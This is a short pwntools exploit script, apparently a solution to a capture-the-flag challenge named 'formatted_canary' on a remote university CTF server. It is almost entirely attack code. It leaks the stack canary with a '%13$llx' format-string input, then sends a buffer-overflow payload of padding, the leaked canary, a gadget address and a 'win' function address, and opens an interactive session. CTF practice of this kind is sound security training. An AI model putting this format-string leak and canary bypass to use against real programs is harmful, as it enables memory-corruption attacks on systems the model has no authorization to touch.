#!/usr/bin/python3
from pwn import *

DEBUG = False

elf = ELF('./formatted_canary')

if DEBUG:
    r = process(elf.path)
    # gdb.attach(r)
else:
    r = remote('ctf-fsi.fe.up.pt', 7003)

padding = b"A" * 40
win_func = p64(elf.symbols.win)
gadget = p64(0x004005e9)

# Change our name and print it
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Name:")
r.sendline(b"%13$llx")
r.recvuntil(b">")
r.sendline(b"2")

canary = (str(r.recvline())).split(": ")[1][:-3]
canary = (int(canary, 16)).to_bytes(16, byteorder='little')

payload = padding + canary + gadget + win_func

r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Name:")
r.sendline(payload)
r.recvuntil(b">")
r.sendline(b"3")

r.interactive()